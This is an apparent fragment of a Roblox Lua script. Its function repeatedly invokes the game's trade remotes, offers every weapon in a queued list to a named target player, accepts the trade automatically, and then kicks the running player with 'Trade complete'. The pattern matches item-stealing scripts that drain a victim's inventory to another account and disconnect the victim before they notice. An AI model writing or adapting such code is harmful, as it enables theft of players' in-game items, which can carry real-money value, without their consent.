local function doTrade(targetName)
    print("🔄 Trading with: " .. targetName)
    local target = Players:FindFirstChild(targetName)
    if not target then return end
    
    local trade = ReplicatedStorage:FindFirstChild("Trade")
    if not trade then return end
    
    local sendReq = trade:FindFirstChild("SendRequest")
    local getStatus = trade:FindFirstChild("GetTradeStatus")
    local offer = trade:FindFirstChild("OfferItem")
    
    while #weaponsToSend > 0 do
        local status = "None"
        pcall(function() status = getStatus:InvokeServer() end)
        
        if status == "None" then
            pcall(function() sendReq:InvokeServer(target) end)
        elseif status == "StartTrade" then
            for i = 1, math.min(4, #weaponsToSend) do
                local weapon = table.remove(weaponsToSend, 1)
                for _ = 1, weapon.Amount do
                    pcall(function() offer:FireServer(weapon.DataID, "Weapons") end)
                    task.wait(0.1)
                end
            end
            task.wait(2)
            acceptTrade()
            repeat task.wait(0.2) until #weaponsToSend == 0
        end
        task.wait(0.5)
    end
    plr:Kick("Trade complete")
end
